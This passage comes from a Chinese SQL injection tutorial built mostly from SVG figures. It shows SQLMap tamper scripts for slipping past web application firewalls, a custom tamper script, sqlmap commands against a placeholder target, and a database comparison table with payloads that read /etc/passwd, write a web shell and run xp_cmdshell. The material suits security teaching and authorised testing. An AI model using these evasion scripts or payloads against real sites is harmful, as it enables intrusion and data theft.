  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-13 50+ Tamper 脚本分类速查 + 14 款最常用详解</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">Tamper = 请求发出前修改 Payload 的钩子函数 → 绕过基于正则/关键字匹配的 WAF</text>  <rect x="40" y="100" width="240" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="160.0" y="120" text-anchor="middle" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">类型 / 首选Tamper</text>  <rect x="290" y="100" width="240" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="410.0" y="120" text-anchor="middle" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">首选效果示例</text>  <rect x="540" y="100" width="500" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="790.0" y="120" text-anchor="middle" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">同系列同功能 3 款 (快速切换)</text>  <rect x="40" y="130" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="290" y="130" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="540" y="130" width="500" height="54" fill="#111c35" stroke="#334155"/>  <text x="50" y="150" font-size="11.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 空格替换类</text>  <text x="50" y="170" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=space2comment</text>  <text x="300" y="162" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: SELECT/**/1</text>  <text x="550" y="148" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· space2hash: #空格</text>  <text x="550" y="164" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· space2morehash: #换行</text>  <text x="550" y="180" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· space2plus: +号代替空格</text>  <rect x="40" y="184" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="184" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="540" y="184" width="500" height="54" fill="#0b1530" stroke="#334155"/>  <text x="50" y="204" font-size="11.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 编码类</text>  <text x="50" y="224" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=charencode</text>  <text x="300" y="216" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: %53%45%4C%45%43%54</text>  <text x="550" y="202" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· charunicodeencode: \u0053</text>  <text x="550" y="218" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· urlencode: URL 双重编码</text>  <text x="550" y="234" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· hex2char: 0x4142 编码</text>  <rect x="40" y="238" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="290" y="238" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="540" y="238" width="500" height="54" fill="#111c35" stroke="#334155"/>  <text x="50" y="258" font-size="11.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 逻辑符号替换</text>  <text x="50" y="278" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=between / greatest</text>  <text x="300" y="270" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: 1=1 → 1 BETWEEN 1 AND 1</text>  <text x="550" y="256" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· equaltolike: =→LIKE</text>  <text x="550" y="272" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· greatest: a&gt;b→greatest(a,b+1)=a</text>  <text x="550" y="288" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· logical: AND→&amp;&amp; OR→||</text>  <rect x="40" y="292" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="292" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="540" y="292" width="500" height="54" fill="#0b1530" stroke="#334155"/>  <text x="50" y="312" font-size="11.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 引号/注释处理</text>  <text x="50" y="332" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=apostrophemask</text>  <text x="300" y="324" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: '→%EF%BC%87</text>  <text x="550" y="310" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· apostrophenullencode: '→%00%27</text>  <text x="550" y="326" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· halfversionedmorekeywords: /*!SELECT*/</text>  <text x="550" y="342" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· versionedmorekeywords: /**/ 包裹关键字</text>  <rect x="40" y="346" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="290" y="346" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="540" y="346" width="500" height="54" fill="#111c35" stroke="#334155"/>  <text x="50" y="366" font-size="11.5" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 大小写/去关键字</text>  <text x="50" y="386" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=randomcase / lowercase</text>  <text x="300" y="378" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: sElEcT 大小写随机</text>  <text x="550" y="364" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· uppercase: SELECT</text>  <text x="550" y="380" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· lowercase: select</text>  <text x="550" y="396" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· securesphere: 双拼拼接 防关键字</text>  <rect x="40" y="400" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="400" width="240" height="54" fill="#0b1530" stroke="#334155"/>  <rect x="540" y="400" width="500" height="54" fill="#0b1530" stroke="#334155"/>  <text x="50" y="420" font-size="11.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 函数变形</text>  <text x="50" y="440" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=modsecurityversioned</text>  <text x="300" y="432" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: /*!50000select*/</text>  <text x="550" y="418" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· overlongutf8: UTF-8 过 3 字节长编码</text>  <text x="550" y="434" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· percentage: S%E%LECT 加 % 号</text>  <text x="550" y="450" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· unmagicquotes: 宽字节 %df%27 绕过 addslashes</text>  <rect x="40" y="454" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="290" y="454" width="240" height="54" fill="#111c35" stroke="#334155"/>  <rect x="540" y="454" width="500" height="54" fill="#111c35" stroke="#334155"/>  <text x="50" y="474" font-size="11.5" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ 拼接/污染类</text>  <text x="50" y="494" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">首选: --tamper=appendnullbyte / hpp</text>  <text x="300" y="486" font-size="12" fill="#e2e8f0" font-family="Consolas,Monospace">效果: id=1&amp;id=2 HTTP 参数污染</text>  <text x="550" y="472" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· splitfield: concat 拆</text>  <text x="550" y="488" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· unionalltounion: UNION ALL→UNION</text>  <text x="550" y="504" font-size="10" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">· multiplespaces: 多空格打乱正则</text>  <rect x="40" y="525" width="1000" height="32" rx="8" fill="#020617" stroke="#a855f7"/>  <text x="540" y="546" text-anchor="middle" font-size="11.5" fill="#c4b5fd" font-family="Consolas,Microsoft YaHei,Arial">✦ 三强组合金句（通杀 80% 国产 WAF）：--tamper="between,charencode,space2comment,unmagicquotes,randomcase" 5 个串联 ✦</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss14" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss14g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s14dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss14g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss14dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-14 Tamper 脚本生命周期工作原理 + 自定义 30 行模板示例</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">写一个自定义 Tamper 只需 1 个 priorities + 1 个 tamper(payload, **kwargs) 函数</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#10b981"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">Tamper 请求钩子 6 步生命周期</text>  <circle cx="58" cy="162" r="10" fill="#0ea5e9"/>  <text x="58" y="166" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">1</text>  <text x="84" y="160" font-size="11" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① SQLMap 生成 payload</text>  <text x="84" y="178" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">UNION SELECT user(),version()-- -</text>  <line x1="58" y1="176" x2="58" y2="206" stroke="#334155" stroke-dasharray="3 2"/>  <circle cx="58" cy="224" r="10" fill="#8b5cf6"/>  <text x="58" y="228" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">2</text>  <text x="84" y="222" font-size="11" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 调用 tamper(payload,**kwargs)</text>  <text x="84" y="240" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">传 payload + headers=[...] + kwargs={type, db</text>  <line x1="58" y1="238" x2="58" y2="268" stroke="#334155" stroke-dasharray="3 2"/>  <circle cx="58" cy="286" r="10" fill="#a855f7"/>  <text x="58" y="290" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">3</text>  <text x="84" y="284" font-size="11" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 自定义函数处理</text>  <text x="84" y="302" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">payload = payload.replace(' ', '/**/')  或 he</text>  <line x1="58" y1="300" x2="58" y2="330" stroke="#334155" stroke-dasharray="3 2"/>  <circle cx="58" cy="348" r="10" fill="#f59e0b"/>  <text x="58" y="352" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">4</text>  <text x="84" y="346" font-size="11" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 返回修改后的 Payload</text>  <text x="84" y="364" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">UNION/**/SELECT/**/user(),version()-- -</text>  <line x1="58" y1="362" x2="58" y2="392" stroke="#334155" stroke-dasharray="3 2"/>  <circle cx="58" cy="410" r="10" fill="#ef4444"/>  <text x="58" y="414" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">5</text>  <text x="84" y="408" font-size="11" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 组装 HTTP 请求发送</text>  <text x="84" y="426" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Header + Body + 编码 → 发往目标服务器</text>  <line x1="58" y1="424" x2="58" y2="454" stroke="#334155" stroke-dasharray="3 2"/>  <circle cx="58" cy="472" r="10" fill="#10b981"/>  <text x="58" y="476" text-anchor="middle" font-size="10" font-weight="800" fill="#fff" font-family="Consolas">6</text>  <text x="84" y="470" font-size="11" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 收到响应后判断是否注入成功</text>  <text x="84" y="488" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">True/False 继续二分猜解 / 下一个 Payload</text>  <line x1="58" y1="486" x2="58" y2="516" stroke="#334155" stroke-dasharray="3 2"/>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">自定义 Tamper 完整 26 行：my_antiwaf_tamper.py</text>  <text x="562" y="152.0" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace"># my_antiwaf_tamper.py 放置到 sqlmap/tamper/ 下</text>  <text x="562" y="167.2" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">from lib.core.enums import PRIORITY</text>  <text x="562" y="182.4" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">__priority__ = PRIORITY.LOWEST  # 执行优先级</text>  <text x="562" y="197.6" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <text x="562" y="212.8" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">def dependencies():  # 运行前检查（可不做）</text>  <text x="562" y="228.0" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    pass  # 无依赖直接跳过</text>  <text x="562" y="243.2" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <text x="562" y="258.4" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">def tamper(payload, **kwargs):</text>  <text x="562" y="273.6" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    &quot;&quot;&quot;空格 → `/**/` + 全关键字大小写随机&quot;&quot;&quot;</text>  <text x="562" y="288.79999999999995" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    if payload is None: return payload</text>  <text x="562" y="304.0" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    import re, random</text>  <text x="562" y="319.2" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    # 规则 1：所有空格替换为 /**/</text>  <text x="562" y="334.4" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    ret = payload.replace(' ', '/**/')</text>  <text x="562" y="349.6" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    # 规则 2：SELECT/UNION/WHERE 等关键字随机大小写</text>  <text x="562" y="364.79999999999995" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    def rc(t):</text>  <text x="562" y="380.0" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">        return ''.join(random.choice([c.upper(),c.lower()]) for c in t)</text>  <text x="562" y="395.2" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    for kw in ['SELECT','UNION','WHERE','FROM','ORDER','BY','AND','OR','USER','VERSION']:</text>  <text x="562" y="410.4" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">        ret = re.sub(r'\\b'+kw+r'\\b', lambda m: rc(m.group(0)), ret, flags=re.I)</text>  <text x="562" y="425.59999999999997" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    # 规则 3：末尾加时间盲注干扰</text>  <text x="562" y="440.8" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    if 'SLEEP' not in ret.upper():</text>  <text x="562" y="456.0" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">        # 留空（按需扩展更多规则）</text>  <text x="562" y="471.2" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">        pass</text>  <text x="562" y="486.4" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace">    return ret  # 返回处理后的 payload</text>  <text x="562" y="501.59999999999997" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <text x="562" y="516.8" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Monospace"># 使用：sqlmap -u URL --tamper my_antiwaf_tamper</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">SQLMap 官方 50+ Tamper 源码目录：kali 下 /usr/share/sqlmap/tamper/ · Windows 下 sqlmap/tamper/*.py 直接照猫画虎</text>
</svg>

### 什么是Tamper脚本？

Tamper脚本是SQLMap的编码/变形插件，用于绕过WAF检测。

**通俗理解：**
像把攻击内容"伪装"成其他样子，让防火墙看不出是攻击。

### 常用Tamper脚本

| 脚本 | 说明 | 适用场景 |
|------|------|----------|
| space2comment | 空格转为注释 | 空格被过滤 |
| space2plus | 空格转为加号 | 空格被过滤 |
| base64encode | Base64编码 | 关键字被过滤 |
| between | 用BETWEEN替代比较符号 | 比较符号被过滤 |
| charencode | URL编码 | 特殊字符被过滤 |
| equaltolike | =转为LIKE | 等号被过滤 |
| escapequotes | 转义引号 | 引号被过滤 |
| modsecurityversioned | 版本化注释 | ModSecurity WAF |

### 使用Tamper脚本

```bash
sqlmap -u "http://target.com?id=1" --tamper=space2comment
```

### 使用多个脚本

```bash
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between
```

### 查看所有Tamper脚本

```bash
sqlmap --list-tampers
```

### 自定义Tamper脚本

创建Python脚本文件：

```python
# my_tamper.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload):
    """
    将空格替换为 /**/
    """
    if payload:
        payload = payload.replace(" ", "/**/")
    return payload
```

使用自定义脚本：
```bash
sqlmap -u "http://target.com?id=1" --tamper=my_tamper.py
```

---

## 4.10 实战案例：MySQL注入实战

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss15" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss15g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s15dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss15g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss15dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-15 MySQL / SQL Server / Oracle / Access 四大数据库差异对比表</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">核心函数不一样，注入 Payload 不一样；SQLMap 自动识别 DBMS 但手动写 Payload 时必备此表</text>  <rect x="30" y="100" width="160" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="110.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">对比维度</text>  <rect x="200" y="100" width="205" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="302.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MySQL 5.7/8.0</text>  <rect x="415" y="100" width="210" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="520.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MSSQL / SQL Server 2012+</text>  <rect x="635" y="100" width="215" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="742.5" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">Oracle 11g/12c/19c</text>  <rect x="860" y="100" width="200" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="960.0" y="123" text-anchor="middle" font-size="11.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">MS Access (.mdb/.accdb)</text>  <rect x="30" y="136" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="136" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="136" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="136" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="136" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="170.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">基础信息函数</text>  <text x="206" y="158" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">user() / database() / version()</text>  <text x="421" y="158" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">current_user / @@servername / @@ver</text>  <text x="641" y="158" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">USER / (SELECT name FROM v$database</text>  <text x="866" y="158" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">CurrentUser() / 无内置 version</text>  <rect x="30" y="196" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="196" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="196" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="196" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="196" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="230.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">字符串拼接</text>  <text x="206" y="218" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">concat(a,b,c) / group_concat()</text>  <text x="421" y="218" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">a+b (字符串相加) / STRING_AGG</text>  <text x="641" y="218" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">a || b / LISTAGG</text>  <text x="866" y="218" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">a &amp; b (Access 运算符)</text>  <rect x="30" y="256" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="256" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="256" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="256" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="256" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="290.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">时间盲注函数</text>  <text x="206" y="278" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">SLEEP(5) / BENCHMARK(1e7,SHA1('x'))</text>  <text x="421" y="278" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">WAITFOR DELAY '00:00:05'</text>  <text x="641" y="278" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_LOCK.SLEEP(5) → 需高权限</text>  <text x="866" y="278" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无原生 → 用笛卡尔积重查询延时</text>  <rect x="30" y="316" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="316" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="316" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="316" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="316" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="350.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">报错注入函数</text>  <text x="206" y="338" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">extractvalue / updatexml / NAME_CON</text>  <text x="421" y="338" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">convert(int,@@version) / cast...</text>  <text x="641" y="338" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">ctxsys.drithsx.sn / DBMS_XMLGEN</text>  <text x="866" y="338" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">无报错注入 → 只能联合/盲注</text>  <rect x="30" y="376" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="376" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="376" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="376" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="376" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="410.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">文件读写</text>  <text x="206" y="398" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">LOAD_FILE('/etc/passwd')</text>  <text x="206" y="418" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">INTO OUTFILE '/tmp/shell.php'</text>  <text x="421" y="398" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">BULK INSERT / OPENROWSET</text>  <text x="641" y="398" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">UTL_FILE / DBMS_LOB</text>  <text x="866" y="398" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">不支持 原生文件</text>  <rect x="30" y="436" width="160" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="436" width="205" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="415" y="436" width="210" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="635" y="436" width="215" height="60" fill="#0b1530" stroke="#334155"/>  <rect x="860" y="436" width="200" height="60" fill="#0b1530" stroke="#334155"/>  <text x="110" y="470.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">命令执行</text>  <text x="206" y="458" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">--os-shell → udf.dll/so（需 FILE 权限）</text>  <text x="421" y="458" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">xp_cmdshell / sp_oacreate</text>  <text x="421" y="478" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">（需 SA 或 alter server role）</text>  <text x="641" y="458" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">DBMS_SCHEDULER 计划任务 Java 存储过程</text>  <text x="866" y="458" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">完全不支持 → 只能 猜解 表</text>  <rect x="30" y="496" width="160" height="60" fill="#111c35" stroke="#334155"/>  <rect x="200" y="496" width="205" height="60" fill="#111c35" stroke="#334155"/>  <rect x="415" y="496" width="210" height="60" fill="#111c35" stroke="#334155"/>  <rect x="635" y="496" width="215" height="60" fill="#111c35" stroke="#334155"/>  <rect x="860" y="496" width="200" height="60" fill="#111c35" stroke="#334155"/>  <text x="110" y="530.0" text-anchor="middle" font-size="10.5" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">系统库/元信息库</text>  <text x="206" y="518" font-size="9" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables / columns</text>  <text x="421" y="518" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">master..sysdatabases</text>  <text x="421" y="538" font-size="9" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">information_schema.tables</text>  <text x="641" y="518" font-size="9" fill="#a855f7" font-family="Consolas,Microsoft YaHei,Arial">SYS.USER_TABLES / ALL_TAB_COLUMNS</text>  <text x="866" y="518" font-size="9" fill="#f59e0b" font-family="Consolas,Microsoft YaHei,Arial">MSysObjects (隐藏系统表，需特殊权限)</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss20" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss20g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
